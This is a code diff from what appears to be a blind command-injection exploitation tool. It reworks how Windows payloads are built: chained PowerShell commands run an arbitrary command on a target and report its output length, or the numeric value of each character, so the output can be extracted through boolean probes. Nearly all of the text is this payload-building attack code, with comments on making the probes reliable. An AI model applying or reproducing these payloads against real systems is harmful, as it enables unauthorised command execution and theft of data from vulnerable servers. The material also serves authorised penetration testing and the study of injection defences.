@@ -142,7 +142,8 @@ def decision(separator, TAG, output_length, holds=True):
     # The target has to print the tag and measure it, so a page that repeats what it was given
     # cannot answer for one that ran the command.
     return checks.windows_boolean_probe(chain,
-      "powershell.exe -InputFormat none write ([string](cmd /c echo " + TAG + ")).trim().length",
+      "powershell.exe -InputFormat none write " +
+      checks.windows_output_bytes(checks.windows_output_text("echo " + TAG)) + ".length",
       "EQU", expected)
   word = tb_payloads._output_word("echo " + TAG)
   var = settings.RANDOM_VAR_GENERATOR
@@ -173,7 +174,8 @@ def get_length(separator, cmd, candidate_length, operator="-eq"):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     chain = checks.windows_separator(separator)
     return checks.windows_boolean_probe(chain,
-      "powershell.exe -InputFormat none write ([string](cmd /c " + cmd + ")).trim().length",
+      "powershell.exe -InputFormat none write " +
+      checks.windows_output_bytes(checks.windows_output_text(cmd)) + ".length",
       {"-eq": "EQU", "-ge": "GEQ", "-le": "LEQ"}.get(operator, "EQU"), candidate_length)
   if separator == settings.PIPE_SEPARATOR:
     measured = _piped_length(word)
@@ -202,8 +204,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
     # The ordinal is worked out on the target: cmd.exe compares strings by locale collation, so only
     # a number can be binary searched.
     return checks.windows_boolean_probe(chain,
-      "powershell.exe -InputFormat none write ([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
-      str(num_of_chars - 1) + ",1)))",
+      "powershell.exe -InputFormat none write ([int](" +
+      checks.windows_output_bytes(checks.windows_output_text(cmd)) +
+      "[" + str(num_of_chars - 1) + "]))",
       "GEQ" if operator == "-le" else "EQU", ascii_char)
   if separator == settings.PIPE_SEPARATOR:
     piped = _piped_ordinal(word, num_of_chars)
